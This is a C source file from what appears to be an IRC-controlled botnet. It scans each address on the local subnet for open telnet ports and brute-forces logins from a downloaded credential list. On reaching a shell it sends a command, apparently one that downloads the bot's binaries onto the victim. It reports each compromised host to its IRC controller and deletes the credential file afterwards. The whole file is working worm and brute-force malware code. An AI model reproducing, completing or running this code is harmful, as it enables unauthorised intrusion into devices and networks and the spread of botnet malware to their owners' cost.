#include "../header/header.h"
#define RED   "\x1B[31m"
#define RESET "\x1B[0m"

FILE *credentials_file = NULL;
// handle file read
char *credentials_line = NULL;

int scan_network(irc_info *info, char *ip) {

	download_credentials_file();

	if (access(CRED_FILE, R_OK) == -1) {
		perror("access cred file");
		irc_send("can't read credentials file\n", strlen("can't read credentials file\n"), info);
		return EXIT_FAILURE;
	}

	char *subnet;
	if (!ip)
		subnet = get_subnet_address();
	else
		subnet = ip;

	if (subnet) {
		
		// get first octect
		char *fo = strtok(subnet, ".");
		// second... and third
		char *so = strtok(NULL, ".");
		char *to = strtok(NULL, ".");

		char msg[50];
		// loop through hosts
		for (int i = 1; i < 255; i++) {
			telnet_info info_t;
			sprintf(info_t.ip, "%s.%s.%s.%d", fo, so, to, i);
			#ifdef DEBUG
			printf("trying to connect to telnet ip = %s\n", info_t.ip);
			#endif
			// if TELNET port is open and listening we'are connected
			if (!telnet_connect(&info_t)) {
				sprintf(msg, "connected to %s\n", info_t.ip);
				irc_send(msg, strlen(msg), info);
				sprintf(msg, "trying to exploit %s\n", info_t.ip);
				irc_send(msg, strlen(msg), info);

				// try to exploit host
				if (!telnet_login(&info_t)) {
					sprintf(msg, "exploited %s\n", info_t.ip);
					irc_send(msg, strlen(msg), info);
				}
				// after tried to login, if sucessful or not, we must seek our file to the beginning
				// to try next host
				fseek(credentials_file, 0 , SEEK_SET);
			}
		}
	} else {
		return EXIT_FAILURE;
	}

	//after tried to exploit hosts, ensure credentials file is closed e removed
	if (credentials_line)
		free(credentials_line);
	if (credentials_file) {
		fclose(credentials_file);
		remove(CRED_FILE);
	}

	return EXIT_SUCCESS;
}

char * get_subnet_address() {

	// getting our address in the subnetwork
	struct ifaddrs *ifaddr, *ifa;
	char *host = calloc(1, NI_MAXHOST);

	// try to get interface address
	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddr");
		return NULL;
	}

	int n;
	// walk through interfaces
	for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {

		if (ifa->ifa_addr == NULL)
			continue;

		// we'll skip interfaces that are not IPv4
		if (ifa->ifa_addr->sa_family != AF_INET) continue;
		if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST) != 0) {
			perror("getnameinfo");
			return NULL;
		}
	}

	freeifaddrs(ifaddr);

	if (!host) {
		free(host);
		return NULL;
	}
	return host;
}


int telnet_connect(telnet_info *info) {

	struct sockaddr_in *addr;
	int fd;

	addr = calloc(1, sizeof(struct sockaddr_in));
	//memset(addr, 0, sizeof(struct sockaddr_in));
	addr->sin_family = AF_INET;
	addr->sin_addr.s_addr = inet_addr(info->ip);
	addr->sin_port = htons(TELNET_PORT);

	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("socket telnet connect");
		return EXIT_FAILURE;
	}

	if (connect(fd, (struct sockaddr *) addr, sizeof(struct sockaddr_in)) == -1) {
		perror("connect telnet connect");
		close(fd);
		return EXIT_FAILURE;
	}
	free(addr);

	info->fd_telnet = fd;

	return EXIT_SUCCESS;
}

int telnet_login(telnet_info *info) {

	char *buf;
	char *last_read;

	char *user = NULL;
	char *pass = NULL;

	bool logged = false;
	bool wait_pass = false;

	// counter to help handle telnet replay packets that repeat content
	int replay_ctr = 0;
	bool resend_login = false;

	terminal_set(info->fd_telnet);

	last_read = calloc(1, MAX_BUF);
	buf = malloc(MAX_BUF + 1);

	struct timeval ts;

	fd_set write_set;
	fd_set read_set;

	// get the first username and pass of the file
	get_next_credentials(&user, &pass);

	while (1) {
		// check if all usernames were used
		if (!user) {
			return EXIT_FAILURE;
		}

		int nfds = info->fd_telnet + 1;

		// resets timeval because linux can modify them inside select() call
		ts.tv_sec = 1;
		ts.tv_usec = 0;

		// clear sets to reuse them
		FD_ZERO(&write_set);
		FD_ZERO(&read_set);

		// we need to set this every time before call select, because linux modify them
		FD_SET(info->fd_telnet, &write_set);
		FD_SET(info->fd_telnet, &read_set);

		if (select(nfds, &read_set, &write_set, NULL, &ts) == -1) {
			perror("select telnet");
			return EXIT_FAILURE;
		}
		if (FD_ISSET(info->fd_telnet, &read_set)) {
			int num_read = read(info->fd_telnet, buf, MAX_BUF - 1);
			buf[num_read] = '\0';

			// don't consider empty string as last_read, to avoid losing messages due CR and LF
			if (buf[0] != '\n' && buf[0] != '\r') {
				strncpy(last_read, buf, num_read);
			}

			// check if we've a prompt
			if (strstr(buf, "#") || strstr(buf, "~") || strstr(buf, "$")) {
				logged = true;
				wait_pass = false;
			} else if (strcasestr(buf, "login incorrect")) {
				wait_pass = false;
				get_next_credentials(&user, &pass);
				continue;
			}

			// some sleep to handle communication strange behaviors
			sleep(1);
		}

		if (FD_ISSET(info->fd_telnet, &write_set)) {

			// empty read must continue to select, this can happens when channel comunication
			// become available for writing but telnet server doesn't sent nothing yet
			if (!*last_read) {
				// some sleep to give the server chance to send something
				sleep(1);

				// we employ a replay counter to help us to identify when we missed something and server is waiting for some data, if replay counter is 3, we may send something
				if (replay_ctr++ >= 3)
					resend_login = true;
				else
					continue;
			} else {
				replay_ctr = 0;
			}
			// do we have a shell? if yes send a evil message :-)
			if (logged) {
				send_download_command(info->fd_telnet);

				return EXIT_SUCCESS;

			// sometimes message can come in strange order, we must be sure that wait_pass is not set ye
			} else if (resend_login || (strcasestr(last_read, "login") && !wait_pass)) {
				resend_login = false;
				#ifdef DEBUG
				printf("%susing username and pass %s %s%s\n", RED, user, pass, RESET);
				#endif
				// trying username
				if ((send(info->fd_telnet, user, strlen(user), MSG_NOSIGNAL) == -1) || send(info->fd_telnet, "\n", 1, MSG_NOSIGNAL) == -1) {
					// EPIPE generate after too much wrong user/pass. we can try workaround this connecting again
					if (errno == EPIPE) {
						// if we can't connect again we must resign and try another host
						if (telnet_connect(info) == EXIT_SUCCESS) {
							wait_pass = false;
							continue;
						} else {
							return EXIT_FAILURE;
						}
					}
				}

				wait_pass = true;
			}
			if (strcasestr(last_read, "password")) {
				if (send(info->fd_telnet, pass, strlen(pass), MSG_NOSIGNAL) == -1) {
					if (errno == EPIPE) {
						// if we can't connect again we must resign and try another host
						if (telnet_connect(info) == EXIT_SUCCESS) {
							wait_pass = false;
							continue;
						} else {
							return EXIT_FAILURE;
						}
					}
				}
			}

			sleep(1);
			last_read[0] = '\0';
		}
	}

	return EXIT_FAILURE;
}

void get_next_credentials(char **user, char **pass) {

	int read = 0;
	size_t len = 0;
	// if we didn't have downloaded the cred file
	if (!credentials_file) {
		credentials_file = fopen(CRED_FILE, "r");

		if (!credentials_file) {
			perror("open cred file for read");
			*user = NULL;
			*pass = NULL;
			return;
		}
	}

	read = getline(&credentials_line, &len, credentials_file);
	// EOF or error
	if (read == -1) {
		if (credentials_line)
			free(credentials_line);
		*user = NULL;
		*pass = NULL;
		return;
	}

	*user = strtok(credentials_line, ":");
	*pass = strtok(NULL, ":");
}

void download_credentials_file() {
	system(DOWNLOAD_CRED_FILE);
}
void send_download_command(int fd_telnet) {
	char db[strlen(DOWNLOAD_BINARIES) + 2];
	sprintf(db, "%s\n", DOWNLOAD_BINARIES);
	write(fd_telnet, db, strlen(db) + 1);
}

void terminal_set(int telnet_fd) {

	struct termios term;

	tcgetattr(telnet_fd, &term);
	cfmakeraw(&term);
       	tcsetattr(telnet_fd, TCSANOW, &term);

}
